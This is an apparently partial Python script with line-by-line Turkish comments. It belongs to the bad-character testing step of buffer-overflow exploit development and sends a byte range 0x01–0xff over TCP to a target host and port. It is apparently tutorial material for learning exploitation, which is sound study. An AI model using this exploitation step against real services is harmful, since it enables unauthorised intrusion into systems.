...
badchars = (
    # Burada kötü karakterler (badchars) tanımlanıyor. 0x01'den 0xff'e kadar tüm karakterler yer alıyor.
    # Bu karakterler hedef uygulamaya gönderilerek hangi karakterlerin sorun çıkardığı (badchar olup olmadığı) tespit edilir.
...
# Yukarıdaki karakterler hedefe gönderilecek ve hangi karakterlerin hedefte sorun oluşturduğunu test edeceksiniz.
...
try:
    # Hata oluşmazsa aşağıdaki kodlar çalışacak.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # TCP bağlantısı kuruluyor.
        s.settimeout(timeout)
        # Bağlantı zaman aşımı 5 saniye olarak ayarlandı.
        s.connect((ip, port))
        # Hedef IP ve port'a bağlantı sağlanıyor.
        s.send(bytes(string, "latin-1"))
        # Yukarıda oluşturulan veri hedefe gönderiliyor. Veriler "latin-1" formatında kodlanarak gönderiliyor.

except:
    # Eğer bağlantı kurulamazsa ya da başka bir hata olursa bu blok çalışacak.
    print("Could not connect")
    # "Could not connect" mesajı ile hata raporu ekrana yazdırılıyor.
